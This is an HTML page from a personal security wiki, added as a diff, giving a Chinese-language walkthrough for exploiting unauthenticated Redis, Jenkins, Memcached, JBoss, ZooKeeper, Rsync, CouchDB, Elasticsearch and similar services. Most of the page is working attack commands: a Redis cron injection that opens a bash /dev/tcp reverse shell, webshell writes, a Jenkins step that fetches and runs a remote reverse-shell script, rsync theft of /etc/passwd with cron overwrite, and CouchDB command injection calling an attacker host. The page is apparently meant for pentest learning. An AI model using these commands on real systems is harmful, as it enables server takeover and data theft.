@@ -1,0 +1,344 @@
+<!DOCTYPE html>
+<html lang="zh-cn">
+
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1.0, user-scalable=no">
+
+    
+      <link rel="icon" href="/favicon.png" />
+    
+
+    <title>
+        
+          未授权访问渗透总结 - 信息安全个人wiki&amp;blog
+        
+    </title>
+
+    <!-- Spectre.css framework -->
+    <link rel="stylesheet" href="https://unpkg.com/spectre.css/dist/spectre.min.css">
+    <link rel="stylesheet" href="https://unpkg.com/spectre.css/dist/spectre-exp.min.css">
+    <link rel="stylesheet" href="https://unpkg.com/spectre.css/dist/spectre-icons.min.css">
+
+    <!-- theme css & js -->
+    
+<link rel="stylesheet" href="/css/book.css">
+
+    
+<script src="/js/book.js"></script>
+
+
+    <!-- tocbot -->
+    <script src="https://cdnjs.cloudflare.com/ajax/libs/tocbot/4.4.2/tocbot.min.js"></script>
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/tocbot/4.4.2/tocbot.css">
+    
+    <!-- katex -->
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/KaTeX/0.10.0/katex.min.css">
+
+    
+    
+<script src="https://cdnjs.cloudflare.com/ajax/libs/zooming/2.1.1/zooming.min.js"></script>
+<script>
+document.addEventListener('DOMContentLoaded', function () {
+    const zooming = new Zooming()
+    zooming.listen('.book-content img')
+})
+</script>
+
+<meta name="generator" content="Hexo 4.2.1"></head>
+
+<body>
+
+<div class="book-container">
+  <div class="book-sidebar">
+    <div class="book-brand">
+  <a href="/">
+    <img src="/favicon.png">
+    <span>信息安全个人WIKI&amp;BLOG</span>
+  </a>
+</div>
+    <div class="book-menu">
+  <ul>
+<li><a href="/">Home</a></li>
+<li><a href="/about">About</a></li>
+<li><a href="/note">Notes</a></li>
+</ul>
+<h1 id="web安全"><a href="#web安全" class="headerlink" title="web安全"></a><strong>web安全</strong></h1><h3 id="Basic"><a href="#Basic" class="headerlink" title="Basic"></a>Basic</h3><ul>
+<li><a href="/contents/xss">WebSecurity-xss</a></li>
+<li><a href="/contents/csrf">WebSecurity-csrf</a></li>
+<li><a href="/contents/ssrf">WebSecurity-ssrf</a></li>
+<li><a href="/contents/FI">WebSecurity-FI</a></li>
+<li><a href="/contents/rce">WebSecurity-rce</a></li>
+<li><a href="/contents/upload">WebSecurity-upload</a></li>
+<li><a href="/contents/xxe">WebSecurity-xxe</a></li>
+</ul>
+<h2 id="labs"><a href="#labs" class="headerlink" title="labs"></a>labs</h2><ul>
+<li><a href="/contents/xsslabs">xss-demo项目练习</a></li>
+<li><a href="/contents/sqllabs">sql-labs项目练习</a></li>
+<li><a href="/contents/uploadlabs">upload-labs系列write-up</a></li>
+<li><a href="/contents/code-breaking">code-breaking write-up</a></li>
+</ul>
+<h2 id="CTF-amp-AWD"><a href="#CTF-amp-AWD" class="headerlink" title="CTF&amp;AWD"></a>CTF&amp;AWD</h2><ul>
+<li><a href="/contents/awd">百越杯AWD攻防源码复现分析</a></li>
+<li><a href="/contents/jarvis">Jarvis oj web部分write-up</a></li>
+<li><a href="/contents/babyphp">hacklu_CTF2018 write up</a></li>
+<li><a href="/contents/suctf">suctf招新赛web全题解</a></li>
+<li><a href="/contents/shanghai">骇极杯CTF Write up</a></li>
+<li><a href="/contents/wangding">2018网鼎杯web部分write-up合集</a></li>
+</ul>
+<h2 id="实战-amp-总结"><a href="#实战-amp-总结" class="headerlink" title="实战&amp;总结"></a>实战&amp;总结</h2><ul>
+<li><a href="/contents/login">登录框渗透总结</a></li>
+<li><a href="/contents/logic">登录逻辑漏洞总结</a></li>
+<li><a href="/contents/unauthorized">未授权访问渗透总结</a></li>
+<li><a href="/contents/mysql-fileread">mysql客户端读取漏洞</a></li>
+</ul>
+<h1 id="内网渗透"><a href="#内网渗透" class="headerlink" title="内网渗透"></a><strong>内网渗透</strong></h1><ul>
+<li>待补充</li>
+</ul>
+<h1 id="代码审计"><a href="#代码审计" class="headerlink" title="代码审计"></a><strong>代码审计</strong></h1><h2 id="php"><a href="#php" class="headerlink" title="php"></a>php</h2><ul>
+<li><a href="/contents/variable">代码审计基础之变量覆盖漏洞</a></li>
+<li><a href="/contents/injection">代码审计基础之命令注入函数</a></li>
+<li><a href="/contents/serialize">代码审计基础之php反序列化</a></li>
+</ul>
+<h2 id="java"><a href="#java" class="headerlink" title="java"></a>java</h2><ul>
+<li>待补充</li>
+</ul>
+<h1 id="安全开发"><a href="#安全开发" class="headerlink" title="安全开发"></a><strong>安全开发</strong></h1><ul>
+<li><a href="/contents/tools">一些工具的使用命令</a></li>
+</ul>
+
+</div>
+
+
+<script src="/js/book-menu.js"></script>
+
+  </div>
+
+  <div class="sidebar-toggle" onclick="sidebar_toggle()" onmouseover="add_inner()" onmouseleave="remove_inner()">
+  <div class="sidebar-toggle-inner"></div>
+</div>
+
+<script>
+function add_inner() {
+  let inner = document.querySelector('.sidebar-toggle-inner')
+  inner.classList.add('show')  
+}
+
+function remove_inner() {
+  let inner = document.querySelector('.sidebar-toggle-inner')
+  inner.classList.remove('show')
+}
+
+function sidebar_toggle() {
+    let sidebar_toggle = document.querySelector('.sidebar-toggle')
+    let sidebar = document.querySelector('.book-sidebar')
+    let content = document.querySelector('.off-canvas-content')
+    if (sidebar_toggle.classList.contains('extend')) { // show
+        sidebar_toggle.classList.remove('extend')
+        sidebar.classList.remove('hide')
+        content.classList.remove('extend')
+    }
+    else { // hide
+        sidebar_toggle.classList.add('extend')
+        sidebar.classList.add('hide')
+        content.classList.add('extend')
+    }
+}
+</script>
+
+  <div class="off-canvas-content">
+    <div class="columns">
+      <div class="column col-10 col-lg-12">
+        <div class="book-navbar">
+          <!-- For Responsive Layout -->
+
+<header class="navbar">
+  <section class="navbar-section">
+    <a onclick="open_sidebar()">
+      <i class="icon icon-menu"></i>
+    </a>
+  </section>
+</header>
+
+        </div>
+        <div class="book-content">
+          <div class="book-post">
+  <p>未授权访问渗透的总结,又臭又长<a id="more"></a></p>
+<p>实战过程中遇到未授权访问往往会比其他攻击手段达到事倍功半的效果</p>
+<p>所以在渗透过程中扫描危险端口是很有必要的</p>
+<p>这里复现&amp;总结一下</p>
+<h2 id="0x00-Redis未授权访问"><a href="#0x00-Redis未授权访问" class="headerlink" title="0x00 Redis未授权访问"></a>0x00 Redis未授权访问</h2><h3 id="漏洞原理"><a href="#漏洞原理" class="headerlink" title="漏洞原理"></a>漏洞原理</h3><p>Redis 默认情况下，会绑定在 0.0.0.0:6379，如果没有进行采用相关的策略，比如添加防火墙规则避免其他非信任来源 ip 访问等，这样将会将 Redis 服务暴露到公网上，如果在没有设置密码认证（一般为空）的情况下，会导致任意用户在可以访问目标服务器的情况下未授权访问 Redis 以及读取 Redis 的数据。</p>
+<h3 id="环境准备"><a href="#环境准备" class="headerlink" title="环境准备"></a>环境准备</h3><p>centos+redis+gcc</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">yum install gcc</span><br><span class="line">wget http://download.redis.io/releases/redis-2.8.17.tar.gz</span><br><span class="line">tar xzvf redis-2.8.17.tar.gz  	<span class="comment">#解压安装包</span></span><br><span class="line"><span class="built_in">cd</span> redis-2.8.17 				<span class="comment"># 进入redis目录</span></span><br><span class="line">make 							<span class="comment">#编译</span></span><br><span class="line"><span class="built_in">cd</span> src/ 						<span class="comment">#进入src目录 </span></span><br><span class="line">cp redis-server /usr/bin/ </span><br><span class="line">cp redis-cli /usr/bin/      	<span class="comment">#将redis-server和redis-cli拷贝到/usr/bin目录下（这样启动redis-server和redis-cli就不用每次都进入安装目录了）</span></span><br><span class="line"><span class="built_in">cd</span> ..   						<span class="comment"># 返回上一级目录</span></span><br><span class="line">cp redis.conf /etc/     		<span class="comment">#将redis.conf拷贝到/etc/目录下</span></span><br><span class="line">redis-server /etc/redis.conf  	<span class="comment">#使用/etc/目录下的redis.conf文件中的配置启动redis服务</span></span><br></pre></td></tr></table></figure>
+
+<p><img src="/img/unauthorized_1.png" alt=""></p>
+<h3 id="攻击流程"><a href="#攻击流程" class="headerlink" title="攻击流程"></a>攻击流程</h3><h4 id="redis写webshell"><a href="#redis写webshell" class="headerlink" title="redis写webshell"></a>redis写webshell</h4><p>条件：1、redis未授权 2、网站开启web服务，知道网站路径，存在读写权限</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">config <span class="built_in">set</span> dir /var/www/html</span><br><span class="line">config <span class="built_in">set</span> dbfilename test.php</span><br><span class="line">config <span class="built_in">set</span> webshell <span class="string">"&lt;?php phpinfo(); ?&gt;"</span></span><br><span class="line">save</span><br></pre></td></tr></table></figure>
+
+<p><img src="/img/unauthorized_2.png" alt=""></p>
+<p>访问写入文件</p>
+<p><img src="/img/unauthorized_3.png" alt=""></p>
+<h4 id="redis-反弹shell"><a href="#redis-反弹shell" class="headerlink" title="redis 反弹shell"></a>redis 反弹shell</h4><p>条件: redis未授权访问</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">redis-cli.exe -h 192.168.19.144</span><br><span class="line">config <span class="built_in">set</span> dir /var/spool/cron</span><br><span class="line"><span class="built_in">set</span> -.- <span class="string">"\n\n\n* * * * * bash -i &gt;&amp; /dev/tcp/192.168.19.142/666 0&gt;&amp;1\n\n\n"</span></span><br><span class="line">config <span class="built_in">set</span> dbfilename root</span><br><span class="line">save</span><br></pre></td></tr></table></figure>
+
+<p><img src="/img/unauthorized_4.png" alt=""></p>
+<p>设置好即可反弹shell</p>
+<p><img src="/img/unauthorized_5.png" alt=""></p>
+<h2 id="0x01-MongoDB-未授权访问"><a href="#0x01-MongoDB-未授权访问" class="headerlink" title="0x01 MongoDB 未授权访问"></a>0x01 MongoDB 未授权访问</h2><h3 id="漏洞原理-1"><a href="#漏洞原理-1" class="headerlink" title="漏洞原理"></a>漏洞原理</h3><p>  开启MongoDB服务时不添加任何参数时,默认是没有权限验证的,登录的用户可以通过默认端口无需密码对数据库任意操作（增、删、改、查高危动作）而且可以远程访问数据库。</p>
+<p>  造成未授权访问的根本原因就在于启动 Mongodb 的时候未设置 –auth 也很少会有人会给数据库添加上账号密码（默认空口令），使用默认空口令这将导致恶意攻击者无需进行账号认证就可以登陆到数据服务器  </p>
+<h3 id="攻击流程-1"><a href="#攻击流程-1" class="headerlink" title="攻击流程"></a>攻击流程</h3><p>使用nosqlbooster直接连即可</p>
+<p><a href="https://nosqlbooster.com/downloads" target="_blank" rel="noopener">https://nosqlbooster.com/downloads</a></p>
+<h2 id="0x02-Jenkins-未授权访问"><a href="#0x02-Jenkins-未授权访问" class="headerlink" title="0x02 Jenkins 未授权访问"></a>0x02 Jenkins 未授权访问</h2><h3 id="漏洞原理-2"><a href="#漏洞原理-2" class="headerlink" title="漏洞原理"></a>漏洞原理</h3><p>默认情况下 Jenkins 面板中用户可以选择执行脚本界面来操作一些系统层命令，攻击者可通过未授权访问漏洞或者暴力破解用户密码等进脚本执行界面从而获取服务器权限。</p>
+<h3 id="环境准备-1"><a href="#环境准备-1" class="headerlink" title="环境准备"></a>环境准备</h3><p>windows下下载一个msi文件一路next即可</p>
+<h3 id="攻击流程-2"><a href="#攻击流程-2" class="headerlink" title="攻击流程"></a>攻击流程</h3><p>进入管理页面/manage下面有一个可以执行命令的功能</p>
+<p><img src="/img/unauthorized_11.png" alt=""></p>
+<p>使用java的代码执行命令</p>
+<p><img src="/img/unauthorized_12.png" alt=""></p>
+<p>当我们知道对方的服务器根路径的时候可以写shell</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">new File (&quot;&#x2F;var&#x2F;www&#x2F;html&#x2F;shell.php&quot;).write(&#39;&lt;?php phpinfo(); ?&gt;&#39;);</span><br></pre></td></tr></table></figure>
+
+<p>也可以用python反弹shell</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">println &quot;wget http:&#x2F;&#x2F;xxx.secpulse.com&#x2F;tools&#x2F;back.py -P &#x2F;tmp&#x2F;&quot;.execute().text</span><br><span class="line">println &quot;python &#x2F;tmp&#x2F;back.py 10.1.1.111 8080&quot;.execute().text</span><br></pre></td></tr></table></figure>
+
+<p>当我们有执行脚本的权限那么很多种方法都可以扩申我们的权限</p>
+<p><a href="https://www.secpulse.com/archives/2166.html" target="_blank" rel="noopener">https://www.secpulse.com/archives/2166.html</a></p>
+<h2 id="0x03-Memcached-未授权访问"><a href="#0x03-Memcached-未授权访问" class="headerlink" title="0x03 Memcached 未授权访问"></a>0x03 Memcached 未授权访问</h2><h3 id="漏洞原理-3"><a href="#漏洞原理-3" class="headerlink" title="漏洞原理"></a>漏洞原理</h3><p>  Memcached 是一套常用的 key-value 分布式高速缓存系统，由于 Memcached 的安全设计缺陷没有权限控制模块，所以对公网开放的Memcache服务很容易被攻击者扫描发现，攻击者无需认证通过命令交互可直接读取 Memcached中的敏感信息。</p>
+<h3 id="环境准备-2"><a href="#环境准备-2" class="headerlink" title="环境准备"></a>环境准备</h3><p><a href="http://static.runoob.com/download/memcached-win64-1.4.4-14.zip" target="_blank" rel="noopener">http://static.runoob.com/download/memcached-win64-1.4.4-14.zip</a></p>
+<p>memcached.exe -d install</p>
+<p>memcached.exe -d start</p>
+<h3 id="攻击流程-3"><a href="#攻击流程-3" class="headerlink" title="攻击流程"></a>攻击流程</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">telnet &lt;target&gt; 11211 或 nc -vv &lt;target&gt; 11211</span><br><span class="line"># stats  &#x2F;&#x2F;查看memcache 服务状态</span><br><span class="line"># stats items  &#x2F;&#x2F;查看所有items</span><br><span class="line"># stats cachedump 32 0  &#x2F;&#x2F;获得缓存key</span><br><span class="line"># get :state:264861539228401373:261588   &#x2F;&#x2F;通过key读取相应value ，获得实际缓存内容，造成敏感信息泄露</span><br></pre></td></tr></table></figure>
+
+<h2 id="0x04-Jboss-未授权访问"><a href="#0x04-Jboss-未授权访问" class="headerlink" title="0x04 Jboss 未授权访问"></a>0x04 Jboss 未授权访问</h2><h3 id="漏洞原理-4"><a href="#漏洞原理-4" class="headerlink" title="漏洞原理"></a>漏洞原理</h3><p>  JBoss是一个基于J2EE的开放源代码应用服务器，代码遵循LGPL许可，可以在任何商业应用中免费使用；JBoss也是一个管理EJB的容器和服务器，支持EJB 1.1、EJB 2.0和EJB3规范。,默认情况下访问 <a href="http://ip:8080/jmx-console" target="_blank" rel="noopener">http://ip:8080/jmx-console</a> 就可以浏览 JBoss 的部署管理的信息不需要输入用户名和密码可以直接部署上传木马有安全隐患。</p>
+<h3 id="环境准备-3"><a href="#环境准备-3" class="headerlink" title="环境准备"></a>环境准备</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">docker search testjboss</span><br><span class="line">docker pull testjboss&#x2F;jboss:latest</span><br><span class="line">docker images</span><br><span class="line">docker run -p 8080:8080 -d 5661a2e31006</span><br></pre></td></tr></table></figure>
+
+<h3 id="攻击流程-4"><a href="#攻击流程-4" class="headerlink" title="攻击流程"></a>攻击流程</h3><p>未授权页面</p>
+<p>ip/jmx-console/</p>
+<p><img src="/img/unauthorized_6.png" alt=""></p>
+<p>1.使用jboss.deployment部署war包</p>
+<p>vodi addurl处添加含有恶意war的url</p>
+<p><img src="/img/unauthorized_7.png" alt=""></p>
+<p>2.使用jboss.system中的MainDeployer服务部署war包</p>
+<p>void deploy处添加含有恶意war的url</p>
+<p><img src="/img/unauthorized_8.png" alt=""></p>
+<p>部署后在访问即可</p>
+<p><img src="/img/unauthorized_9.png" alt=""></p>
+<p>搜资料时发现这种方法也可写入文件</p>
+<p><a href="https://www.icode9.com/content-3-227326.html" target="_blank" rel="noopener">https://www.icode9.com/content-3-227326.html</a></p>
+<p>关于war包的话可以自己写一个shell.jsp 打包成zip 改后缀改成war即可</p>
+<h2 id="0x05-VNC未授权访问"><a href="#0x05-VNC未授权访问" class="headerlink" title="0x05 VNC未授权访问"></a>0x05 VNC未授权访问</h2><p>过于简单不复现了 vncviewer即可</p>
+<h2 id="0x06-ZooKeeper-未授权访问"><a href="#0x06-ZooKeeper-未授权访问" class="headerlink" title="0x06 ZooKeeper 未授权访问"></a>0x06 ZooKeeper 未授权访问</h2><h3 id="漏洞原理-5"><a href="#漏洞原理-5" class="headerlink" title="漏洞原理"></a>漏洞原理</h3><p>  Zookeeper是针对分布式应用程序的协调服务。它允许通过一个简单的界面来管理诸如命名，同步，配置管理和组服务之类的通用服务，并且在操作系统上使用文件系统的数据模型。</p>
+<h3 id="环境准备-4"><a href="#环境准备-4" class="headerlink" title="环境准备"></a>环境准备</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">wget https:&#x2F;&#x2F;mirrors.tuna.tsinghua.edu.cn&#x2F;apache&#x2F;zookeeper&#x2F;zookeeper-3.4.14&#x2F;zookeeper-3.4.14.tar.gz</span><br><span class="line">tar -xzvf zookeeper-3.4.14.tar.gz </span><br><span class="line">cd zookeeper-3.4.14&#x2F;conf</span><br><span class="line">mv zoo_sample.cfg zoo.cfg</span><br><span class="line">cd ..&#x2F;bin&#x2F;</span><br><span class="line">bash zkServer.sh start # 启动</span><br></pre></td></tr></table></figure>
+
+<p><img src="/img/unauthorized_13.png" alt=""></p>
+<h3 id="攻击流程-5"><a href="#攻击流程-5" class="headerlink" title="攻击流程"></a>攻击流程</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">#envi获取该服务器的环境</span><br><span class="line">echo envi|nc 192.168.19.144 2181</span><br><span class="line">#dump列出未完成的会话和临时节点</span><br><span class="line">echo dump |nc 192.168.19.144 2181</span><br><span class="line">#reqs列出未完成的请求</span><br><span class="line">echo reqs |nc 192.168.19.144 2181</span><br><span class="line">#ruok：测试服务器是否在非错误状态下运行。如果服务器正在运行，它将以imok响应。否则，它将完全不响应。</span><br><span class="line">echo ruok |nc 192.168.19.144 2181</span><br><span class="line">#stat：列出有关性能和已连接客户端的统计信息。</span><br><span class="line">echo stat |nc 192.168.19.144 2181</span><br></pre></td></tr></table></figure>
+
+<h2 id="0x07-Rsync-未授权访问"><a href="#0x07-Rsync-未授权访问" class="headerlink" title="0x07 Rsync 未授权访问"></a>0x07 Rsync 未授权访问</h2><h3 id="漏洞原理-6"><a href="#漏洞原理-6" class="headerlink" title="漏洞原理"></a>漏洞原理</h3><p>  Rsync（remote synchronize）是一个远程数据同步工具，可通过 LAN/WAN 快速同步多台主机间的文件，也可以同步本地硬盘中的不同目录。Rsync 默认允许匿名访问，如果在配置文件中没有相关的用户认证以及文件授权，就会触发隐患。Rsync 的默认端口为 837。</p>
+<h3 id="环境准备-5"><a href="#环境准备-5" class="headerlink" title="环境准备"></a>环境准备</h3><p>docker+vulhub</p>
+<p><img src="/img/unauthorized_14.png" alt=""></p>
+<p><img src="/img/unauthorized_15.png" alt=""></p>
+<h3 id="攻击流程-6"><a href="#攻击流程-6" class="headerlink" title="攻击流程"></a>攻击流程</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">普通连接</span><br><span class="line">rsync rsync:&#x2F;&#x2F;&lt;target_ip&gt;:873&#x2F;</span><br><span class="line">rsync rsync:&#x2F;&#x2F;&lt;target_ip&gt;:873&#x2F;src</span><br><span class="line">下载文件</span><br><span class="line">rsync rsync:&#x2F;&#x2F;&lt;target_ip&gt;:873&#x2F;src&#x2F;etc&#x2F;passwd .&#x2F;</span><br><span class="line">rsync rsync:&#x2F;&#x2F;&lt;target_ip&gt;:873&#x2F;src&#x2F;etc&#x2F;crontab .&#x2F;</span><br><span class="line">cat crontab</span><br><span class="line">rsync -av sh rsync:&#x2F;&#x2F;&lt;target_ip&gt;:873&#x2F;src&#x2F;etc&#x2F;cron.hourly   sh中包含了反弹shell的命令</span><br><span class="line">nc -lvnp 666</span><br></pre></td></tr></table></figure>
+
+<p><img src="/img/unauthorized_16.png" alt=""></p>
+<p>可以看到其每小时的第17分钟执行run-parts –report /etc/cron.hourly</p>
+<p>那么我们可以传个包含反弹shell命令的脚本覆盖掉cron.hourly</p>
+<p>再在本地监听即可</p>
+<p><img src="/img/unauthorized_18.png" alt=""></p>
+<h2 id="0x08-CouchDB-未授权访问"><a href="#0x08-CouchDB-未授权访问" class="headerlink" title="0x08 CouchDB 未授权访问"></a>0x08 CouchDB 未授权访问</h2><h3 id="漏洞原理-7"><a href="#漏洞原理-7" class="headerlink" title="漏洞原理"></a>漏洞原理</h3><p>  CouchDB 默认在 5984 端口开放 Restful 的 API 接口，用于数据库的管理功能。其 HTTP Server 默认开启时没有进行验证，而且绑定在0.0.0.0，所有用户均可通过 API 访问导致未授权访问。任何连接到服务器端口上的人，都可以调用相关 API 对服务器上的数据进行任意的增删改查，其中通过 API 修改 local.ini 配置文件，可进一步导致执行任意系统命令，获取服务器权限！</p>
+<h3 id="环境准备-6"><a href="#环境准备-6" class="headerlink" title="环境准备"></a>环境准备</h3><p>docker+vulhub</p>
+<p><img src="/img/unauthorized_17.png" alt=""></p>
+<h3 id="攻击流程-7"><a href="#攻击流程-7" class="headerlink" title="攻击流程"></a>攻击流程</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">curl http://靶机:5984</span><br><span class="line">curl http://靶机:5984/_config</span><br><span class="line">curl -X PUT <span class="string">'http://靶机:5984/_config/query_servers/cmd'</span> -d <span class="string">'"curl http://攻击机:9999/test.php"'</span></span><br><span class="line">curl -X PUT <span class="string">'http://靶机:5984/vultest'</span></span><br><span class="line">curl -X PUT <span class="string">'http://靶机:5984/vultest/vul'</span> -d <span class="string">'&#123;"_id":"770895a97726d5ca6d70a22173005c7b"&#125;'</span></span><br><span class="line">curl -X POST <span class="string">'http://靶机:5984/vultest/_temp_view?limit=11'</span> -d <span class="string">'&#123;"language":"cmd","map":""&#125;'</span> -H <span class="string">'Content-Type: application/json'</span></span><br></pre></td></tr></table></figure>
+
+<h2 id="0x09-Elasticsearch-未授权访问"><a href="#0x09-Elasticsearch-未授权访问" class="headerlink" title="0x09 Elasticsearch 未授权访问"></a>0x09 Elasticsearch 未授权访问</h2><h3 id="漏洞原理-8"><a href="#漏洞原理-8" class="headerlink" title="漏洞原理"></a>漏洞原理</h3><p>Elasticsearch 是一个分布式的开源搜索和分析引擎，适用于所有类型的数据，包括文本、数字、地理空间、结构化和非结构化数据。Elasticsearch 在 Apache Lucene 的基础上开发而成，由 Elasticsearch N.V.（即现在的 Elastic）于 2010 年首次发布。Elasticsearch 以其简单的 REST 风格 API、分布式特性、速度和可扩展性而闻名，是 Elastic Stack 的核心组件；Elastic Stack 是适用于数据采集、充实、存储、分析和可视化的一组开源工具。人们通常将 Elastic Stack 称为 ELK Stack（代指 Elasticsearch、Logstash 和 Kibana），目前 Elastic Stack 包括一系列丰富的轻量型数据采集代理，这些代理统称为 Beats，可用来向 Elasticsearch 发送数据。</p>
+<p>Elasticsearch是用Java开发的，并且受Apache许可条款的约束。 它是第二受欢迎的企业搜索引擎。</p>
+<p>Elasticsearch专为云计算而设计，具有实时搜索，稳定可靠的性能，快速响应以及易于安装和使用的特点。</p>
+<p>不安全地使用Elasticsearch也引起了一些问题。 默认情况下，在安装Elasticsearch之后，可以使用端口9200在Web公告中访问和查看数据信息。</p>
+<h3 id="环境准备-7"><a href="#环境准备-7" class="headerlink" title="环境准备"></a>环境准备</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># elasticsearch需要JDK1.8+</span></span><br><span class="line">yum install java-1.8.0-openjdk</span><br><span class="line"><span class="comment"># 创建elasticsearch用户，elasticsearch不能root执行</span></span><br><span class="line">useradd elasticsearch</span><br><span class="line">passwd elasticsearch</span><br><span class="line">su elasticsearch</span><br><span class="line"><span class="comment">#下载环境</span></span><br><span class="line">wget https://artifacts.elastic.co/downloads/elasticsearch/elasticsearch-5.5.0.zip</span><br><span class="line">unzip elasticsearch-5.5.0.zip </span><br><span class="line"><span class="built_in">cd</span> elasticsearch-5.5.0/bin</span><br><span class="line">./elasticsearch</span><br></pre></td></tr></table></figure>
+
+<p><img src="/img/unauthorized_19.png" alt=""></p>
+<h3 id="攻击流程-8"><a href="#攻击流程-8" class="headerlink" title="攻击流程"></a>攻击流程</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">curl http://localhost:9200/_nodes <span class="comment">#查看节点数据</span></span><br><span class="line">http://localhost:9200/_cat/indices <span class="comment">#indices包含了_river一般就是安装了river了</span></span><br><span class="line"><span class="comment">#安装了river之后可以同步多种数据库数据（包括关系型的mysql、mongodb等）。</span></span><br><span class="line">http://localhost:9200/_river/_search 查看数据库敏感信息</span><br><span class="line"></span><br><span class="line">如有安装head插件：</span><br><span class="line">http://localhost:9200/_plugin/head/ web管理界面</span><br></pre></td></tr></table></figure>
+
+
+
+<h2 id="referer"><a href="#referer" class="headerlink" title="referer"></a>referer</h2><p><a href="https://xz.aliyun.com/t/6103#toc-8" target="_blank" rel="noopener">https://xz.aliyun.com/t/6103#toc-8</a></p>
+<p><a href="https://paper.seebug.org/409/#0x05-zookeeper" target="_blank" rel="noopener">https://paper.seebug.org/409/#0x05-zookeeper</a></p>
+<p><a href="https://www.yuque.com/desm0nd/osrdpc/lyusxf" target="_blank" rel="noopener">https://www.yuque.com/desm0nd/osrdpc/lyusxf</a></p>
+
+</div>
+
+
+  <div class="book-comments">
+    
+
+
+
+
+  </div>
+
+
+
+<script src="/js/book-post.js"></script>
+
+        </div>
+      </div>
+      <div class="column col-2 hide-lg">
+        <div class="book-post-info">
+  
+    <div class="book-post-meta">
+
+  <div class="author">
+
+    <!-- Author image -->
+    <div class="author-img">
+      
+        <figure class="avatar avatar-lg">
+          <img src="/avater.jpg" alt="...">
+        </figure>
+      
+    </div>
+
+    <!-- Author title -->
+    <div class="author-title">
+      <div>comical</div>
+      <div>2019-10-19</div>
+    </div>
+  </div>
+
+  
+    <div class="divider"></div>
+
+    <div class="link">
+      <a class="category-link" href="/categories/%E7%BB%BC%E5%90%88%E7%AF%87/">综合篇</a>
+
+      <a class="tag-link" href="/tags/%E7%BB%BC%E5%90%88%E7%AF%87/" rel="tag">#综合篇</a>
+    </div>
+    
+  
+
+  <div class="divider"></div>
+</div>
+  
+
+  <div class="book-tocbot">
+</div>
+<div class="book-tocbot-menu">
+  <a class="book-toc-expand" onclick="expand_toc()">Expand all</a>
+  <a onclick="go_top()">Back to top</a>
+  <a onclick="go_bottom()">Go to bottom</a>
+</div>
+
+
+<script src="/js/book-toc.js"></script>
+
+</div>
+      </div>
+    </div>
+  </div>
+  
+  <a class="off-canvas-overlay" onclick="hide_canvas()"></a>
+</div>
+
+</body>
+</html>
+
+
+<script src="/js/book.js"></script>
